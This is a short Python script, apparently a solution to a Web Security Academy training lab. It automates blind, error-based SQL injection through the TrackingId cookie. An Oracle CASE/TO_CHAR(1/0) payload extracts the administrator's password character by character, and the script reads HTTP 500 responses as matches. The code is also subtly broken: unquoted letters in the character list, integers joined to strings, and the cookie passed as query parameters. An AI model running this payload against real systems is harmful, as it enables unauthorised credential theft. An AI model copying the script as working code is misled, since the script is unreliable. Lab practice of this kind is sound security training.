import requests

#Create wordlists to iterate through
list_a = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
list_b = [0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z]

#URL creation
url = "https://0a9600b004f6f6bc80e4f30f0020000e.web-security-academy.com/"
cookie_1 = "TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,"
cookie_2 = ",1)='"
cookie_3 = "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"

#Loopy
for item_a in list_a:
    for item_b in list_b:
        cookie = cookie_1 + item_a + cookie_2 + item_b + cookie_3
        # Make the GET request
        response = requests.get(url, cookie)
        # Check if the request was 500 (status code 500)
        if response.status_code == 500:
            print(item_b)
